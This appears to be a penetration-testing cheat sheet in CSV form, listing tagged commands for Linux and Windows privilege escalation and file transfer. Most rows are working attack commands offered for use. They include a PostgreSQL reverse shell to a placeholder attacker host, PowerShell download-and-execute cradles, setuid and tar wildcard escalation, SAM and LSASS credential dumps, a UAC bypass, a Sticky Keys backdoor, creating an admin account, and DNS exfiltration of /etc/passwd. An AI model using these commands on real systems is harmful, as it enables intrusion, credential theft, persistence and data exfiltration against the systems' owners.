Command,Cmd,Tags,Page
GTFOBins Python,"python -c 'import os; os.setuid(0); os.system(""""/bin/bash"""")'","Linux,Linux Privesc,GTFOBins,Python",
GTFOBins Vim,vim -c ':!/bin/bash',"Linux,Linux Privesc,GTFOBins",
PostgreSQL Command Exec,"COPY (SELECT '') TO PROGRAM 'bash -c """"bash -i >& /dev/tcp/[IP]/[PORT] 0>&1""""';","Linux,Linux Privesc,PostgreSQL",
Systemctl Exploitation,"echo '[Service]\nType=oneshot\nExecStart=/bin/bash -c """"chmod +s /bin/bash""""\n[Install]\nWantedBy=multi-user.target' > /tmp/root.service","Linux,Linux Privesc,Systemd",
Wildcard Injection tar,"echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh && echo """" > '--checkpoint=1' && echo """" > '--checkpoint-action=exec=sh shell.sh'","Linux,Linux Privesc",
NFS Root Squash,showmount -e [IP] && mount -t nfs [IP]:/share /mnt -o vers=3,"Linux,Linux Privesc,NFS",
Process Monitoring pspy,./pspy64 -pf -i 1000,"Linux,Linux Privesc,pspy",
Shared Library Hijacking,"ldd /usr/bin/binary | grep ""not found"" && gcc -shared -fPIC -o /tmp/lib.so exploit.c","Linux,Linux Privesc,Library Hijacking",
Python Library Hijacking,"echo 'import os;os.system(""""/bin/bash"""")' > /tmp/library.py && export PYTHONPATH=/tmp:$PYTHONPATH","Linux,Linux Privesc,Python",
Logrotate Exploitation,echo '/var/log/test.log {\n\tdaily\n\trotate 3\n\tpostrotate\n\t\tchmod +s /bin/bash\n\tendscript\n}' > /etc/logrotate.d/exploit,"Linux,Linux Privesc",
Polkit CVE-2021-4034,pkexec /bin/bash,"Linux,Linux Privesc",
DirtyCOW Exploitation,gcc -pthread dirty.c -o dirty -lcrypt && ./dirty,"Linux,Linux Privesc,Kernel Exploit",
WinPEAS Enumeration,.\winPEASx64.exe quiet servicesinfo applicationsinfo,Windows Privesc,
PowerUp Invoke-AllChecks,"powershell -ep bypass -c ""IEX(New-Object Net.WebClient).downloadString('http://[IP]/PowerUp.ps1'); Invoke-AllChecks""","Windows Privesc,PowerShell",
Unquoted Service Path,"wmic service get name,displayname,pathname,startmode | findstr /i ""auto"" | findstr /i /v ""c:\windows\\"" | findstr /i /v """"""""""",Windows Privesc,
AlwaysInstallElevated,reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated,Windows Privesc,
Service Binary Hijacking,"sc qc [SERVICE] && icacls ""C:\path\to\service.exe""",Windows Privesc,
DLL Hijacking Search,"echo %PATH% && dir /s /b *.dll 2>nul | findstr /i ""program""",Windows Privesc,
Registry Autoruns,reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run,Windows Privesc,
Scheduled Tasks Enum,"schtasks /query /fo LIST /v | findstr /B /C:""TaskName"" /C:""Run As User""",Windows Privesc,
Token Impersonation,".\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a ""/c net user admin password123! /add"" -t *","Windows Privesc,JuicyPotato",
PrintSpoofer Exploit,.\PrintSpoofer.exe -i -c cmd.exe,Windows Privesc,
SeImpersonatePrivilege,whoami /priv | findstr SeImpersonatePrivilege,Windows Privesc,
SAM Database Dump,reg save HKLM\SAM C:\temp\sam && reg save HKLM\SYSTEM C:\temp\system,Windows Privesc,
LSASS Memory Dump,rundll32.exe C:\windows\System32\comsvcs.dll MiniDump [PID] C:\temp\lsass.dmp full,Windows Privesc,
Cached Credentials,"reg query ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /v DefaultPassword",Windows Privesc,
Weak Service Permissions,"accesschk.exe /accepteula -uwcqv ""Authenticated Users"" *",Windows Privesc,
PowerShell History,type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt,"Windows Privesc,PowerShell",
Saved RDP Credentials,cmdkey /list,Windows Privesc,
GPP Password Extraction,findstr /S /I cpassword \\[DOMAIN]\sysvol\[DOMAIN]\policies\*.xml,Windows Privesc,
UAC Bypass fodhelper,"REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ && REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d ""cmd.exe""",Windows Privesc,
Sticky Keys Backdoor,"REG ADD ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"" /v Debugger /t REG_SZ /d ""C:\windows\system32\cmd.exe""",Windows Privesc,
Windows Exploit Suggester,python windows-exploit-suggester.py --database 2023-10-12-mssb.xls --systeminfo systeminfo.txt,Windows Privesc,
KrbRelayUp Local PrivEsc,.\KrbRelayUp.exe relay -m rbcd -cn FAKE$ -cp Password123!,"Windows Privesc,Kerberos",
Python HTTP Server,python3 -m http.server [PORT] --bind [IP],File Transfer,
PHP HTTP Server,php -S [IP]:[PORT],File Transfer,
Netcat Transfer Send,nc -lvnp [PORT] < file.txt,"File Transfer,Netcat",
Netcat Transfer Receive,nc [IP] [PORT] > file.txt,"File Transfer,Netcat",
PowerShell Download,"powershell -c ""(New-Object System.Net.WebClient).DownloadFile('http://[IP]/file.exe', 'C:\temp\file.exe')""","File Transfer,PowerShell",
PowerShell IEX Download,"powershell ""IEX(New-Object Net.WebClient).downloadString('http://[IP]/script.ps1')""""","File Transfer,PowerShell",
Certutil Download,certutil.exe -urlcache -split -f http://[IP]/file.exe file.exe,File Transfer,
Bitsadmin Download,bitsadmin /transfer myDownloadJob /download /priority normal http://[IP]/file.exe C:\temp\file.exe,File Transfer,
Curl Windows Download,curl.exe -o file.exe http://[IP]/file.exe,File Transfer,
Wget Linux Download,wget http://[IP]/file.txt -O /tmp/file.txt,File Transfer,
SCP Transfer,scp file.txt [USER]@[IP]:/tmp/,"File Transfer,SSH",
Rsync Transfer,"rsync -avz -e ""ssh -p [PORT]"" file.txt [USER]@[IP]:/tmp/","File Transfer,SSH",
SMB Server Impacket,impacket-smbserver share . -smb2support -user test -password test,"File Transfer,SMB",
SMB Client Upload,"smbclient //[IP]/share -U [USER] -c ""put file.txt""","File Transfer,SMB",
FTP Upload,"echo -e ""open [IP]\nuser [USER] [PASSWORD]\nbinary\nput file.exe\nquit"" | ftp -n","File Transfer,FTP",
TFTP Transfer,tftp -i [IP] PUT file.exe,File Transfer,
Base64 Transfer Encode,base64 -w 0 file.bin > file.b64,File Transfer,
Base64 Transfer Decode,"echo ""[BASE64_STRING]"" | base64 -d > file.bin",File Transfer,
Hex Dump Transfer,xxd -p file.bin | tr -d '\n' > file.hex && xxd -r -p file.hex file.bin,File Transfer,
DNS Exfiltration,nslookup $(cat /etc/passwd | base64 | head -1).[DOMAIN],"File Transfer,DNS",
ICMP Exfiltration,xxd -p -c 16 file.txt | while read line; do ping -p $line -c 1 [IP]; done,File Transfer,
Living Off The Land wmic,"wmic process call create ""\\[IP]\share\file.exe""",File Transfer,
Powershell Bits Transfer,"[System.Net.WebClient]::new().DownloadFile('http://[IP]/file.exe','C:\temp\file.exe')","File Transfer,PowerShell",
Invoke-WebRequest,Invoke-WebRequest -Uri http://[IP]/file.zip -OutFile C:\temp\file.zip,"File Transfer,PowerShell",
Start-BitsTransfer,Start-BitsTransfer -Source http://[IP]/file.exe -Destination C:\temp\,"File Transfer,PowerShell",
MsXml Download,"$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://[IP]/file.exe',$false);$h.send();iex $h.responseText","File Transfer,PowerShell",
VBS Download Script,"echo strUrl = WScript.Arguments.Item(0) > wget.vbs && echo StrFile = WScript.Arguments.Item(1) >> wget.vbs && echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs && echo Err.Clear >> wget.vbs",File Transfer,
Debug.exe Transfer,echo open [IP] [PORT] > ftp.txt && echo USER anonymous >> ftp.txt && echo binary >> ftp.txt && echo GET file.exe >> ftp.txt && echo bye >> ftp.txt && ftp -v -n -s:ftp.txt,File Transfer,
Socat File Transfer,socat TCP4-LISTEN:[PORT];fork file:file.txt,"File Transfer,Socat",
OpenSSL Transfer Encrypted,openssl enc -aes-256-cbc -salt -in file.txt -out file.enc -k [PASSWORD],File Transfer,
Tar Over SSH,tar czf - /path/to/files | ssh [USER]@[IP] 'tar xzf - -C /destination',"File Transfer,SSH",
DD Over Netcat,dd if=/dev/sda | gzip -1 - | nc [IP] [PORT],"File Transfer,Netcat",
Git Clone via HTTP,git clone http://[IP]/repo.git,File Transfer,
Wget Spider Mode,wget --spider -r -nd -nv -H -l 1 http://[IP]/,File Transfer,
Aria2c Parallel Download,aria2c -x 16 -s 16 http://[IP]/largefile.iso,File Transfer,
Rclone Mount Cloud,rclone mount remote:path /local/path --daemon,File Transfer,
